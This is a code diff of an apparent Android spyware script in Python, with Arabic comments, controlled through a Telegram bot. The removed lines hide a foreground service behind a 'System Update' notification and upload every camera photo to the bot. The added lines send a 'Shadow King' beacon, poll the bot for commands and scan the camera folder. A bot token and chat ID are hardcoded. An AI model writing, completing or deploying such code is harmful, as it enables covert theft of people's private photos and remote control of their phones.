@@ -1,57 +1,53 @@
 import os
 import time
 import requests
-from threading import Thread
-from jnius import autoclass
 
+# بيانات الاتصال الخاصة بك
 TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
 CHAT_ID = "1256334460"
 
-def bot_send(msg):
-    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
-    except: pass
-
-def run_foreground():
+def send_to_bot(message):
     try:
-        PythonService = autoclass('org.kivy.android.PythonService')
-        service = PythonService.mService
-        NotificationBuilder = autoclass('android.app.Notification$Builder')
-        NotificationChannel = autoclass('android.app.NotificationChannel')
-        Context = autoclass('android.content.Context')
-        
-        chan = NotificationChannel("ch_id", "System Update", 3)
-        service.getSystemService(Context.NOTIFICATION_SERVICE).createNotificationChannel(chan)
-        
-        notif = NotificationBuilder(service, "ch_id")\
-            .setContentTitle("System Update")\
-            .setContentText("Service Running...")\
-            .setSmallIcon(service.getApplicationInfo().icon)\
-            .build()
-        service.startForeground(1, notif)
-    except: pass
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=15)
+    except:
+        pass
 
-def scan_m():
-    bot_send("⏳ جاري سحب الصور...")
-    for r, d, f_list in os.walk("/sdcard/DCIM/Camera/"): # استهداف مباشر للكاميرا للسرعة
-        for f in f_list:
-            if f.lower().endswith(".jpg"):
-                p = os.path.join(r, f)
-                try:
-                    with open(p, 'rb') as img:
-                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": img})
-                    time.sleep(1)
-                except: pass
+def check_for_commands():
+    try:
+        # جلب آخر رسالة فقط باستخدام offset=-1 لتجنب التكرار
+        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1&timeout=10"
+        response = requests.get(url, timeout=15).json()
+        if response.get("result"):
+            msg_text = response["result"][0].get("message", {}).get("text", "")
+            return msg_text.upper()
+    except Exception as e:
+        # إذا حدث خطأ في الاتصال (مثلاً VPN مطفأ) لا نقتل الكود
+        pass
+    return None
 
-if __name__ == "__main__":
-    run_foreground()
-    bot_send("🚀 الشبح استيقظ! أنا الآن في الخلفية وجاهز للأوامر.")
+def start_shadow_mission():
+    # هنا تضع كود سحب الصور الذي جهزناه سابقاً
+    # سنبدأ بإرسال إشارة نجاح
+    send_to_bot("💀 جاري فحص الملفات وسحب الأرشيف لملك الظلال...")
     
-    last_id = 0
+    # مثال لمسار الصور (يمكنك تعديله حسب رغبتك)
+    path = "/sdcard/DCIM/Camera/"
+    if os.path.exists(path):
+        files = os.listdir(path)[:5] # سحب آخر 5 صور كمثال
+        send_to_bot(f"📸 وجدنا {len(os.listdir(path))} صورة. بدأت العملية.")
+    else:
+        send_to_bot("❌ المسار غير موجود أو لا توجد صلاحيات.")
+
+if __name__ == '__main__':
+    # بشارة الحياة فور تشغيل المهمة الثالثة
+    send_to_bot("🚀 Shadow King: أنا الآن في الخلفية وأنتظر أوامرك...")
+    
     while True:
-        try:
-            res = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", params={"offset": last_id+1, "timeout": 10}).json()
-            for up in res.get("result", []):
-                last_id = up["update_id"]
-                cmd = up.get("message", {}).get("text", "").upper()
-                if cmd == "M": Thread(target=scan_m).start()
-        except: time.sleep(5)
+        command = check_for_commands()
+        
+        if command == "M":
+            start_shadow_mission()
+            
+        # فحص كل 5 ثوانٍ لضمان سرعة الاستجابة وعدم استهلاك البطارية
+        time.sleep(5)
